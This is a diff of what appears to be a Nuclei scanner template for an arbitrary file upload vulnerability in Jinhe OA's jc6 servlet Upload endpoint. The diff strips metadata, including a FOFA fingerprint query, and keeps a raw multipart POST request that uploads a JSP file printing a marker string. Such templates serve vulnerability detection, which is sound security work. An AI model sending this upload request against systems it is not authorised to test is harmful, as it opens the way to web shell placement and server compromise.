@@ -3,12 +3,8 @@ info:
   name: 金和OA jc6servletUpload接口存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nh5esccikcmwwu4m'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nh5esccikcmwwu4m
-    fofa: app="金和网络-金和OA"||body="/jc6/platform/sys/login"
 http:
 - raw:
   - 'POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d
 
 
-
-
     --ee055230808ca4602e92d0b7c4ecc63d
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <% out.println("dudesuite"); %>
